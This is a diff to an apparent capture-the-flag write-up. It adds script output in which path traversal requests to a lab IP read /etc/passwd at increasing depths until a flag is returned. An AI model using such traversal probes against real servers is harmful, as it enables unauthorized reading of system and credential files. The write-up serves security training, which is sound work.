@@ -82,15 +82,23 @@ By running the script we get the below output:
 ```bash
 node script.js 
 
+http://192.168.56.101/?page=../etc/passwd
 alert('Wtf ?');
-alert('Wtf ?');
+http://192.168.56.101/?page=../../etc/passwd
 alert('Wrong..');
+http://192.168.56.101/?page=../../../etc/passwd
 alert('Nope..');
+http://192.168.56.101/?page=../../../../etc/passwd
 alert('Almost.');
+http://192.168.56.101/?page=../../../../../etc/passwd
 alert('Still nope..');
+http://192.168.56.101/?page=../../../../../../etc/passwd
 alert('Nope..');
+http://192.168.56.101/?page=../../../../../../../etc/passwd
 alert('Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 ');
 ```
+
+From the output we can see that passing the query `../../../../../../../etc/passwd` returns a flag!
 
 ## How to exploit the breach
 
